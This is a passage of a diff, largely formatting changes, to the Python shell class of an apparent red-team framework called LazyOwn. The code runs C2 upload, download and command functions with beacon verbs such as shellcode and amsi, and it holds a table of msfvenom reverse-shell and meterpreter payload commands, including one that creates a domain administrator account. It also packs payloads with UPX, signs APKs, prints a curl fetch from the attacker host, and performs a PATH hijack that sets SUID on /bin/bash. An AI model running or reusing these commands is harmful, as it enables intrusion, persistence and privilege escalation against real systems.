+                            install_hint = tool.get("install_command", f"git clone {tool.get('repo_url', '')}")
                             print_warn(f"'{binary}' not found in PATH.")
                             print_warn(f"Install: {install_hint[:120]}")
                         command_replaced = replace_command_placeholders(execute_command, self.params).strip()
@@ -2101,56 +2117,57 @@ class LazyOwnShell(cmd2.Cmd):
                                 final_command = command_replaced
                         self.cmd(final_command)
 
-                    if 'upload_file' in tool:
-                        for file_path in [f.strip() for f in tool['upload_file'].split(',')]:
+                    if "upload_file" in tool:
+                        for file_path in [f.strip() for f in tool["upload_file"].split(",")]:
                             if file_path:
-                                self.display_toastr(f"Remote Upload executing: upload_c2 {file_path}", type='info')
+                                self.display_toastr(f"Remote Upload executing: upload_c2 {file_path}", type="info")
                                 self.onecmd(f"upload_c2 {file_path}")
                                 self.cmd("sleep 10")
 
-                    if 'remote_command' in tool:
-                        remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
-                        self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
+                    if "remote_command" in tool:
+                        remotecmd = replace_command_placeholders(tool["remote_command"], self.params)
+                        self.display_toastr(f"Remote command executing: {remotecmd}", type="info")
                         self.onecmd(f"issue_command_to_c2 {remotecmd}")
 
-                    if 'download_file' in tool:
-                        for file_path in [f.strip() for f in tool['download_file'].split(',')]:
+                    if "download_file" in tool:
+                        for file_path in [f.strip() for f in tool["download_file"].split(",")]:
                             if file_path:
-                                self.display_toastr(f"Remote Download executing: download_c2 {file_path}", type='info')
+                                self.display_toastr(f"Remote Download executing: download_c2 {file_path}", type="info")
                                 self.onecmd(f"download_c2 {file_path}")
 
-                    if 'lazycommand' in tool:
-                        lazycommand = replace_command_placeholders(tool['lazycommand'], self.params)
-                        self.display_toastr(f"Lazy Command executing: {lazycommand}", type='info')
-                        for lazy_cmd in [c.strip() for c in lazycommand.split(',')]:
+                    if "lazycommand" in tool:
+                        lazycommand = replace_command_placeholders(tool["lazycommand"], self.params)
+                        self.display_toastr(f"Lazy Command executing: {lazycommand}", type="info")
+                        for lazy_cmd in [c.strip() for c in lazycommand.split(",")]:
                             if lazy_cmd:
                                 self.onecmd(lazy_cmd)
 
                 except KeyError as e:
-                    self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
+                    self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type="error")
                     return
 
             except Exception as e:
-                self.display_toastr(f"Error in plugin '{name}': {e}", type='error')
+                self.display_toastr(f"Error in plugin '{name}': {e}", type="error")
                 return
 
         trigger_label = ", ".join(addon_trigger) if addon_trigger else "(none)"
         wrapper_yaml.__doc__ = (
             f"{description}\n\nCategory: {addon_category}"
             f"\nOS: {addon_os}"
-            f"\nTrigger: {trigger_label}"
-            + (f"\nTags: {', '.join(tags)}" if tags else "")
+            f"\nTrigger: {trigger_label}" + (f"\nTags: {', '.join(tags)}" if tags else "")
         )
         cmd2.utils.categorize(wrapper_yaml, addon_category)
-        if hasattr(self, f'do_{name}'):
-            print_msg(f"Command '{name}' already exists as built-in — YAML registered as trigger-only [{addon_category}].")
+        if hasattr(self, f"do_{name}"):
+            print_msg(
+                f"Command '{name}' already exists as built-in — YAML registered as trigger-only [{addon_category}]."
+            )
         else:
-            setattr(self, f'do_{name}', wrapper_yaml)
+            setattr(self, f"do_{name}", wrapper_yaml)
             print_msg(f"Command '{name}' registered [{addon_category}] from YAML.")
 
     def register_all_adversary_commands(self):
         for file in glob.glob("lazyadversaries/*.yaml"):
-            with open(file, 'r') as f:
+            with open(file, "r") as f:
                 try:
                     data = yaml.safe_load(f)
                     if isinstance(data, dict):
@@ -2166,15 +2183,15 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn(f"Skipping invalid adversary entry (missing required fields): {adv.get('name', '<unnamed>')}")
             return
 
-        name = adv['name'].replace('.', '_')
-        description = adv['description']
+        name = adv["name"].replace(".", "_")
+        description = adv["description"]
 
         @cmd2.with_category("14. Adversary Emulation")
         def cmd_wrapper(_):
-            return self.do_adversary_yaml(str(adv['id']) + ' l')
+            return self.do_adversary_yaml(str(adv["id"]) + " l")
 
         cmd_wrapper.__doc__ = description
-        setattr(self, f'do_{name}', cmd_wrapper)
+        setattr(self, f"do_{name}", cmd_wrapper)
         print_msg(f"Command '{name}' registered for adversary ID {adv['id']}")
 
     def display_toastr(self, message, type="info"):
@@ -2184,7 +2201,7 @@ class LazyOwnShell(cmd2.Cmd):
             "success": {"border_style": "green", "text_style": "bold green"},
             "error": {"border_style": "red", "text_style": "bold red"},
             "warning": {"border_style": "yellow", "text_style": "bold yellow"},
-            "info": {"border_style": "blue", "text_style": "bold blue"}
+            "info": {"border_style": "blue", "text_style": "bold blue"},
         }
         style = styles.get(type.lower(), styles["info"])
         terminal_size = self.console.size
@@ -2197,7 +2214,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.console.print(f"[{type.upper()}] {clean_message}", style=style["text_style"])
             return
 
-        lines = clean_message.split('\n')
+        lines = clean_message.split("\n")
         max_line_length = max(len(line) for line in lines)
         min_width = max(20, len(type.upper()) + 8)
         max_width = min(100, int(terminal_width * 0.9))
@@ -2206,15 +2223,18 @@ class LazyOwnShell(cmd2.Cmd):
 
         if max_line_length > optimal_width - 8:
             import textwrap
+
             wrapped_lines = []
             for line in lines:
                 if len(line) <= optimal_width - 8:
                     wrapped_lines.append(line)
                 else:
-                    wrapped = textwrap.fill(line, width=optimal_width - 8, break_long_words=False, break_on_hyphens=False)
-                    wrapped_lines.extend(wrapped.split('\n'))
+                    wrapped = textwrap.fill(
+                        line, width=optimal_width - 8, break_long_words=False, break_on_hyphens=False
+                    )
+                    wrapped_lines.extend(wrapped.split("\n"))
 
-            final_message = '\n'.join(wrapped_lines)
+            final_message = "\n".join(wrapped_lines)
             num_lines = len(wrapped_lines)
         else:
             final_message = clean_message
@@ -2228,7 +2248,7 @@ class LazyOwnShell(cmd2.Cmd):
             width=optimal_width,
             padding=(0, 2),
             title=f"[bold]{type.upper()}[/bold]",
-            title_align="center"
+            title_align="center",
         )
 
         def show_toastr():
@@ -2240,7 +2260,7 @@ class LazyOwnShell(cmd2.Cmd):
         """Helper method to wrap text to fit within specified width."""
         import textwrap
 
-        lines = text.split('\n')
+        lines = text.split("\n")
         wrapped_lines = []
 
         for line in lines:
@@ -2248,12 +2268,11 @@ class LazyOwnShell(cmd2.Cmd):
                 wrapped_lines.append(line)
             else:
                 wrapped = textwrap.fill(line, width=max_width, break_long_words=True)
-                wrapped_lines.extend(wrapped.split('\n'))
+                wrapped_lines.extend(wrapped.split("\n"))
 
-        return '\n'.join(wrapped_lines)
+        return "\n".join(wrapped_lines)
 
     @cmd2.with_category(miscellaneous_category)
-
     def completedefault(self, text, line, begidx, endidx):
         """Fall through to the payload-aware completer for unhandled commands."""
         try:
@@ -2268,14 +2287,11 @@ class LazyOwnShell(cmd2.Cmd):
             completer = PayloadAwareCompleter(
                 payload,
                 addon_lister=lambda: [
-                    p.stem for p in __import__("pathlib").Path(
-                        getattr(self, "lazyaddons_dir", "lazyaddons")
-                    ).glob("*.yaml")
+                    p.stem
+                    for p in __import__("pathlib").Path(getattr(self, "lazyaddons_dir", "lazyaddons")).glob("*.yaml")
                 ],
                 plugin_lister=lambda: [
-                    p.stem for p in __import__("pathlib").Path(
-                        getattr(self, "plugins_dir", "plugins")
-                    ).glob("*.lua")
+                    p.stem for p in __import__("pathlib").Path(getattr(self, "plugins_dir", "plugins")).glob("*.lua")
                 ],
             )
             return [s.text for s in completer.complete(cmd, partial)]
@@ -2290,6 +2306,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         import os as _os
         import sys as _sys
+
         _sessions = getattr(self, "sessions_dir", "sessions") or "sessions"
         _legacy_sentinel = _os.path.join(_sessions, "theone")
         _config_dir = _os.path.join(_os.path.expanduser("~"), ".config", "lazyown")
@@ -2315,15 +2332,13 @@ class LazyOwnShell(cmd2.Cmd):
             _ux_debug("auto-login failed", exc)
 
         try:
-            from core.credential_vault import check_dangerous_defaults
-            from core.credential_vault import seal_payload
             from core.config import save_payload
+            from core.credential_vault import check_dangerous_defaults, seal_payload
+
             payload = load_payload()
             warnings = check_dangerous_defaults(payload)
             if warnings:
-                print_warn(
-                    f"\n  Security: {len(warnings)} credential(s) still use default values."
-                )
+                print_warn(f"\n  Security: {len(warnings)} credential(s) still use default values.")
                 for w in warnings[:3]:
                     print_warn(f"    {w}")
                 if len(warnings) > 3:
@@ -2345,6 +2360,7 @@ class LazyOwnShell(cmd2.Cmd):
                 from rich.console import Console as _SplashConsole
 
                 from cli.splash import render_splash as _render_splash
+
                 _render_splash(
                     _SplashConsole(),
                     ["LazyOwn", "RedTeam Framework"],
@@ -2409,12 +2425,12 @@ class LazyOwnShell(cmd2.Cmd):
                 enabled = str(self.params.get("enable_inline_hints", True)).lower() not in ("false", "0", "no")
                 if enabled:
                     ctx = {
-                        "phase":   self.params.get("phase")   or "",
-                        "os_id":   str(self.params.get("os_id") or ""),
-                        "rhost":   self.params.get("rhost")   or "",
-                        "domain":  self.params.get("domain")  or "",
+                        "phase": self.params.get("phase") or "",
+                        "os_id": str(self.params.get("os_id") or ""),
+                        "rhost": self.params.get("rhost") or "",
+                        "domain": self.params.get("domain") or "",
                         "api_key": self.params.get("api_key") or "",
-                        "lhost":   self.params.get("lhost")   or "",
+                        "lhost": self.params.get("lhost") or "",
                     }
                     _print_session_tip(ctx)
             except Exception:
@@ -2437,12 +2453,14 @@ class LazyOwnShell(cmd2.Cmd):
 
         try:
             from modules.cli_auth import needs_login
+
             if not needs_login():
                 return statement
         except ImportError:
             return statement
 
         from utils import print_warn
+
         print_warn("Authentication required. Use: register  (first time)  or  login --remember <username>")
         return ""
 
@@ -2479,26 +2497,22 @@ class LazyOwnShell(cmd2.Cmd):
         print_warn("GoodBye LazyOwner")
 
     @cmd2.with_category(miscellaneous_category)
-
     def complete_phase(self, text, line, begidx, endidx):
         """Tab-complete phase names."""
         return [p for p in _PHASES if p.startswith(text)]
 
     @cmd2.with_category(miscellaneous_category)
-
     def complete_l00t(self, text, line, begidx, endidx):
         """Tab-complete l00t subcommands."""
         subs = ("search", "reuse", "graph", "mark")
         return [s for s in subs if s.startswith(text)]
 
     @cmd2.with_category(miscellaneous_category)
-
     def complete_loot(self, text, line, begidx, endidx):
         """Tab-complete loot subcommands (delegates to l00t)."""
         return self.complete_l00t(text, line, begidx, endidx)
 
     @cmd2.with_category(miscellaneous_category)
-
     def complete_assign(self, text, line, begidx, endidx):
         """Tab-complete the parameter name from the live payload keys.
 
@@ -2516,7 +2530,6 @@ class LazyOwnShell(cmd2.Cmd):
         return sorted(key for key in self.params if key.startswith(text))
 
     @cmd2.with_category(miscellaneous_category)
-
     def complete_scope(self, text, line, begidx, endidx):
         """Tab-complete the scope subcommands."""
         try:
@@ -2568,7 +2581,6 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"    {GREEN}{entry}{RESET}")
 
     @with_category("10. Command & Control")
-
     def complete_palette(self, text, line, begidx, endidx):
         """Tab-complete the palette command using the live command index.
 
@@ -2725,10 +2737,7 @@ class LazyOwnShell(cmd2.Cmd):
             pass
 
         if not os_known:
-            print_msg(
-                "OS not yet identified — running ping before nmap "
-                "to select the correct tool chain."
-            )
+            print_msg("OS not yet identified — running ping before nmap to select the correct tool chain.")
             self.onecmd("ping")
 
         self.cmd(f"{path}/modules/lazynmap.sh -t {target_ip}")
@@ -2808,9 +2817,7 @@ class LazyOwnShell(cmd2.Cmd):
         rport = self.params["rport"]
         lport = self.params["lport"]
         if not rhost or not lhost or not lport or not rport:
-            print_error(
-                "rhost, lhost, rpor, and lport must be assign, to more info see: help set"
-            )
+            print_error("rhost, lhost, rpor, and lport must be assign, to more info see: help set")
             return
         self.run_script("modules/legacy/lazywerkzeug.py", rhost, rport, lhost, lport)
         return
@@ -2898,7 +2905,6 @@ class LazyOwnShell(cmd2.Cmd):
             - Ensure that `modules/legacy/lazysniff.py` has the appropriate permissions and dependencies to run.
             - Ensure that the network interface specified is valid and properly configured.
         """
-
 
         env = os.environ.copy()
         env["LANG"] = "en_US.UTF-8"
@@ -3075,6 +3081,7 @@ class LazyOwnShell(cmd2.Cmd):
             "--email_password",
             email_password,
         )
+
     def run_lazysearch_bot(self):
         """
         Run the internal module GROQ AI located at `modules/legacy/lazysearch_bot.py` with the specified parameters.
@@ -3406,14 +3413,7 @@ class LazyOwnShell(cmd2.Cmd):
         field = self.params["field"]
         wordlist = self.params["wordlist"]
 
-        if (
-            not rhost
-            or not rport
-            or not lhost
-            or not lport
-            or not field
-            or not wordlist
-        ):
+        if not rhost or not rport or not lhost or not lport or not field or not wordlist:
             print_error("rhost and rport field and lhost lport wordlist must be assign")
             return
         self.run_script(
@@ -3581,9 +3581,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not wordlist or not rhost:
             print_error("rhost and wordlist must be assign")
             return
-        print_warn(
-            "this may not be accurate. using a version a little bit updated from searchsploit"
-        )
+        print_warn("this may not be accurate. using a version a little bit updated from searchsploit")
         path = os.getcwd()
         self.cmd(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")
 
@@ -3758,9 +3756,7 @@ class LazyOwnShell(cmd2.Cmd):
         port = self.params["reverse_shell_port"]
         path = os.getcwd()
         if not ip or not port:
-            print_error(
-                "rhost and reverse_shell_port must be assign, more info see, help assign"
-            )
+            print_error("rhost and reverse_shell_port must be assign, more info see, help assign")
             return
         self.cmd(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
         return
@@ -3871,9 +3867,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not mode or not target_ip or not attacker_ip:
             print_error("mode, rhost, and lhost must be assign, more info see help assign")
             return
-        self.cmd(
-            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
-        )
+        self.cmd(f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}")
         return
 
     def run_lazymsfvenom(self):
@@ -3956,9 +3950,7 @@ class LazyOwnShell(cmd2.Cmd):
             "17": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
             ),
-            "18": (
-                "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
-            ),
+            "18": ("msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"),
             "19": (
                 f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_windows.py'
             ),
@@ -3985,24 +3977,34 @@ class LazyOwnShell(cmd2.Cmd):
             ),
             "27": (
                 f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_linux.py'
-            )
+            ),
         }
         if choice in commands:
-            if choice == '14':
-                self.cmd(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
+            if choice == "14":
+                self.cmd(
+                    f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe'
+                )
                 print_warn("esperando payload shell.exe ")
                 time.sleep(15)
                 print_warn("codificando payload shell_encoded.exe ")
             self.cmd(commands[choice])
-            self.cmd(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
-            self.cmd(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o sessions/rev.bin')
+            self.cmd(
+                f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin'
+            )
+            self.cmd(
+                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o sessions/rev.bin'
+            )
             print_msg(f"Generated payload: {commands[choice]}")
-            if choice == '15':
-                self.cmd("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
+            if choice == "15":
+                self.cmd(
+                    "sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000"
+                )
                 if not is_binary_present("jarsigner"):
                     print_warn("jarsigner is not present in the system, installing...")
                     self.cmd("sudo apt-get install openjdk-11-jdk-headless")
-                self.cmd("sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi")
+                self.cmd(
+                    "sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi"
+                )
                 self.cmd("sudo jarsigner -verify -verbose -certs sessions/shell.apk")
                 if not is_binary_present("zipalign"):
                     print_warn("zipalign is not presetn in the system, installing...")
@@ -4020,7 +4022,7 @@ class LazyOwnShell(cmd2.Cmd):
                     self.cmd("upx sessions/shell.elf")
                 if os.path.exists("sessions/shell64.elf"):
                     self.cmd("upx sessions/shell64.elf")
-            if choice in ["3", "4", "9", "10", "14","20"]:
+            if choice in ["3", "4", "9", "10", "14", "20"]:
                 if os.path.exists("sessions/shell.exe"):
                     self.cmd("upx sessions/shell.exe")
                 if os.path.exists("sessions/shell64.exe"):
@@ -4037,9 +4039,7 @@ class LazyOwnShell(cmd2.Cmd):
             if choice == "13":
                 if os.path.exists("sessions/payload.c"):
                     print_msg("Payload in C generated: payload.c")
-                    self.cmd(
-                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
-                    )
+                    self.cmd(f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip")
                     print_msg(
                         f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
                     )
@@ -4083,10 +4083,7 @@ class LazyOwnShell(cmd2.Cmd):
             - The method modifies the PATH environment variable, which may affect the execution of other binaries.
         """
 
-
-        print_msg(
-            f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
-        )
+        print_msg(f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}")
         result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
         print_msg(result)
         if result == "0":
@@ -4127,9 +4124,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"chmod +x /tmp/{binary_name}")
         print_msg("export PATH=/tmp:$PATH")
 
-        print_msg(
-            f"Lazy path hijacking with binary_name: {binary_name} to assign u+s to /bin/bash"
-        )
+        print_msg(f"Lazy path hijacking with binary_name: {binary_name} to assign u+s to /bin/bash")
         return
 
     def run_script(self, script_name, *args):
@@ -4194,9 +4189,7 @@ class LazyOwnShell(cmd2.Cmd):
             - Ensure proper exception handling to manage process interruptions.
         """
 
-        process = subprocess.Popen(
-            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-        )
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         try:
             for line in iter(process.stdout.readline, ""):
                 self.output += line
@@ -4213,7 +4206,6 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("[Interrupted] Process terminated")
 
     @cmd2.with_category(miscellaneous_category)
-
     def _render_chain_next(self, raw_args: str) -> None:
         """Render the chain's ``next`` view for the supplied verb (helper).
 
@@ -4225,6 +4217,7 @@ class LazyOwnShell(cmd2.Cmd):
             None.
         """
         from cli.command_chain import CommandChain
+
         tokens = raw_args.split()
         limit: int | None = None
         if tokens and tokens[-1].isdigit():
@@ -4237,9 +4230,7 @@ class LazyOwnShell(cmd2.Cmd):
         chain = CommandChain()
         target = self.params.get("rhost") or None
         phase = (self.params.get("phase") or "").strip()
-        steps = chain.next(
-            cmd=verb, params=self.params, target=target, phase=phase, limit=limit
-        )
+        steps = chain.next(cmd=verb, params=self.params, target=target, phase=phase, limit=limit)
         if not steps:
             print_warn(f"No next-step recommendations for '{verb}'.")
             return
@@ -4248,13 +4239,12 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"  {step.name:<22} [{step.source}] {step.reason}")
 
     @cmd2.with_category(command_and_control_category)
-
     def get_output(self):
         """Devuelve la salida acumulada"""
         return self.output
 
     @cmd2.with_category(lateral_movement_category)
-    def upload_file_to_c2(self, file_path, clientid = None):
+    def upload_file_to_c2(self, file_path, clientid=None):
         """
         Sube un archivo al C2.
 
@@ -4265,12 +4255,14 @@ class LazyOwnShell(cmd2.Cmd):
         None
         """
         if not clientid:
-            clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
+            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
 
         data = {"client_id": clientid}
         with open(file_path, "rb") as f:
             files = {"file": f}
-            response = requests.post(f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=False)
+            response = requests.post(
+                f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=False
+            )
             if response.status_code == 200:
                 return f"File {file_path} uploaded successfully."
 
@@ -4278,8 +4270,6 @@ class LazyOwnShell(cmd2.Cmd):
                 return f"Failed to upload file {file_path}. Status code: {response.status_code}"
 
     @cmd2.with_category(lateral_movement_category)
-
-
     def complete_upload_c2(self, text, line, begidx, endidx):
         """Autocomplete implant names from implant_config_*.json files in sessions/ directory"""
 
@@ -4292,15 +4282,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         for file_path in config_files:
             try:
-                with open(file_path, 'r') as f:
+                with open(file_path, "r") as f:
                     data = json.load(f)
                     name = data.get("name")
                     if name:
                         implant_names.append(name)
             except (json.JSONDecodeError, IOError):
-
                 continue
-
 
         implant_names.sort()
 
@@ -4332,7 +4320,7 @@ class LazyOwnShell(cmd2.Cmd):
         response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
 
         if response.status_code == 200:
-            with open(output, 'wb') as f:
+            with open(output, "wb") as f:
                 f.write(response.content)
             print_msg(f"File {file_name} downloaded successfully.")
         else:
@@ -4346,6 +4334,7 @@ class LazyOwnShell(cmd2.Cmd):
         when the C2 has generated stronger credentials than the defaults.
         """
         import re
+
         creds_file = os.path.join(self.path, ".c2_credentials.txt")
         if not os.path.isfile(creds_file):
             return
@@ -4362,6 +4351,7 @@ class LazyOwnShell(cmd2.Cmd):
                     self.params["c2_user"] = new_user
                     self.params["c2_pass"] = new_pass
                     from core.config import save_payload
+
                     payload = load_payload()
                     payload["c2_user"] = new_user
                     payload["c2_pass"] = new_pass
@@ -4400,7 +4390,6 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Error inesperado: {e}")
 
     @cmd2.with_category(post_exploitation_category)
-
     def complete_issue_command_to_c2(self, text, line, begidx, endidx):
         """Autocomplete: 1st arg = implant name, 2nd arg = beacon command (with : if needed)"""
         parts = line.split()
@@ -4432,7 +4421,7 @@ class LazyOwnShell(cmd2.Cmd):
             "migrate:",
             "shellcode:",
             "amsi:",
-            "terminate:"
+            "terminate:",
         ]
 
         config_dir = self.sessions_dir
@@ -4441,7 +4430,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         for file_path in glob.glob(pattern):
             try:
-                with open(file_path, 'r') as f:
+                with open(file_path, "r") as f:
                     data = json.load(f)
                     name = data.get("name")
                     if name:
@@ -4466,9 +4455,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             return [cmd for cmd in commands if cmd.startswith(current_word)]
 
-
     @cmd2.with_category(reporting_category)
-
     def view_code(self, stdscr):
         """
         Display C and ASM code side by side in a curses-based interface.
@@ -4491,9 +4478,8 @@ class LazyOwnShell(cmd2.Cmd):
         stdscr.nodelay(1)
         stdscr.timeout(100)
 
-
-        path = os.path.join(os.getcwd(), 'sessions')
-        c_files = [f for f in os.listdir(path) if f.endswith('.c')]
+        path = os.path.join(os.getcwd(), "sessions")
+        c_files = [f for f in os.listdir(path) if f.endswith(".c")]
 
         if not c_files:
             stdscr.addstr(0, 0, "No .c files found in 'sessions/' directory.")
@@ -4505,7 +4491,6 @@ class LazyOwnShell(cmd2.Cmd):
         for i, file in enumerate(c_files):
             stdscr.addstr(i + 1, 0, f"    {i + 1}. {file}")
         stdscr.refresh()
-
 
         selected_file = None
         while not selected_file:
@@ -4527,11 +4512,10 @@ class LazyOwnShell(cmd2.Cmd):
         code_asm = code_c.replace(".c", ".asm")
         subprocess.run(["gcc", "-S", "-o", code_asm, code_c])
 
-        with open(code_c, 'r') as f:
+        with open(code_c, "r") as f:
             c_code = f.readlines()
-        with open(code_asm, 'r') as f:
+        with open(code_asm, "r") as f:
             asm_code = f.readlines()
-
 
         selected_line = 0
         max_lines = max(len(c_code), len(asm_code))
@@ -4540,32 +4524,29 @@ class LazyOwnShell(cmd2.Cmd):
         while True:
             stdscr.clear()
 
-
             for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                 if i < len(c_code):
                     line = c_code[i].rstrip()
                     try:
                         if i == selected_line:
-                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1], curses.A_REVERSE)
+                            stdscr.addstr(i - top_line, 0, line[: stdscr.getmaxyx()[1] - 1], curses.A_REVERSE)
                         else:
-                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1])
+                            stdscr.addstr(i - top_line, 0, line[: stdscr.getmaxyx()[1] - 1])
                     except curses.error:
                         pass
-
 
             for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                 if i < len(asm_code):
                     line = asm_code[i].rstrip()
                     try:
                         if i == selected_line:
-                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41], curses.A_REVERSE)
+                            stdscr.addstr(i - top_line, 40, line[: stdscr.getmaxyx()[1] - 41], curses.A_REVERSE)
                         else:
-                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41])
+                            stdscr.addstr(i - top_line, 40, line[: stdscr.getmaxyx()[1] - 41])
                     except curses.error:
                         pass
 
             stdscr.refresh()
-
 
             key = stdscr.getch()
             if key == curses.KEY_UP and selected_line > 0:
@@ -4580,15 +4561,12 @@ class LazyOwnShell(cmd2.Cmd):
                 break
 
     @cmd2.with_category(post_exploitation_category)
-
-
     def get_available_actions(self):
         """Returns a list of available actions using cmd2 introspection."""
         # Usa get_all_commands() para obtener todos los comandos definidos como do_*
         return self.get_all_commands()
 
     @cmd2.with_category(post_exploitation_category)
-
     def _create_strict_yaml_prompt(self, base_prompt, nmap_services, knowledge_base):
         """
         Create a prompt that strictly enforces YAML response format without any narrative text
@@ -4598,7 +4576,9 @@ class LazyOwnShell(cmd2.Cmd):
         for service, instances in nmap_services.items():
             nmap_context += f"- {service}\n"
             for instance in instances:
-                nmap_context += f"   IP: {instance['ip']}, Port: {instance['port']}, Protocol: {instance.get('protocol', 'tcp')}\n"
+                nmap_context += (
+                    f"   IP: {instance['ip']}, Port: {instance['port']}, Protocol: {instance.get('protocol', 'tcp')}\n"
+                )
 
         # Extraer contexto adicional
         {"target": self.params.get("domain", "unknown")}
@@ -4622,7 +4602,7 @@ class LazyOwnShell(cmd2.Cmd):
             service: http
             mitre_info:
             mitre_id: T1190
-            mitre_name: Exploit Public-Facing Application""".replace("        ","")
+            mitre_name: Exploit Public-Facing Application""".replace("        ", "")
 
         # Build the final prompt with explicit YAML instructions
         return f"""
@@ -4661,84 +4641,95 @@ class LazyOwnShell(cmd2.Cmd):
         DO NOT INCLUDE ```yaml or ``` MARKERS.
         NEVER USE <think> TAGS.
         YOUR COMPLETE RESPONSE MUST BE VALID YAML AND NOTHING ELSE.
-        """.strip().replace("        ","")
+        """.strip().replace("        ", "")
 
     @cmd2.with_category(reporting_category)
-
     def process_scan_csv(self, csv_file, ip, port, all_data, processed_ips):
         """Processes a single scan CSV file."""
-        with open(csv_file, 'r', newline='') as infile:
-            reader = csv.DictReader(infile, delimiter=';')
+        with open(csv_file, "r", newline="") as infile:
+            reader = csv.DictReader(infile, delimiter=";")
             for row in reader:
-                host_entry = next((h for h in all_data['hosts'] if h['ip'] == ip), None)
+                host_entry = next((h for h in all_data["hosts"] if h["ip"] == ip), None)
                 if host_entry is None:
                     host_entry = {"ip": ip, "hostnames": [row.get("FQDN", "")], "ports": []}
-                    all_data['hosts'].append(host_entry)
+                    all_data["hosts"].append(host_entry)
                     processed_ips.add(ip)
-                if port is not None and port not in host_entry['ports']:
-                    host_entry['ports'].append(port)
+                if port is not None and port not in host_entry["ports"]:
+                    host_entry["ports"].append(port)
 
                 service_entry = {
                     "ip": ip,
-                    "port": int(row['PORT']) if row['PORT'] else port,
-                    "protocol": row['PROTOCOL'],
-                    "service": row['SERVICE'],
-                    "version": row['VERSION']
+                    "port": int(row["PORT"]) if row["PORT"] else port,
+                    "protocol": row["PROTOCOL"],
+                    "service": row["SERVICE"],
+                    "version": row["VERSION"],
                 }
-                if service_entry not in all_data['services']:
-                    all_data['services'].append(service_entry)
+                if service_entry not in all_data["services"]:
+                    all_data["services"].append(service_entry)
 
     def process_vuln_csv(self, csv_file, ip, all_data, processed_ips):
         """Processes a single vulnerability CSV file."""
-        with open(csv_file, 'r', newline='') as infile:
-            reader = csv.DictReader(infile, delimiter=';')
+        with open(csv_file, "r", newline="") as infile:
+            reader = csv.DictReader(infile, delimiter=";")
             for row in reader:
                 service_entry = {
                     "ip": ip,
-                    "port": int(row['PORT']) if row['PORT'] else None,
-                    "protocol": row['PROTOCOL'],
-                    "service": row['SERVICE'],
-                    "version": row['VERSION']
+                    "port": int(row["PORT"]) if row["PORT"] else None,
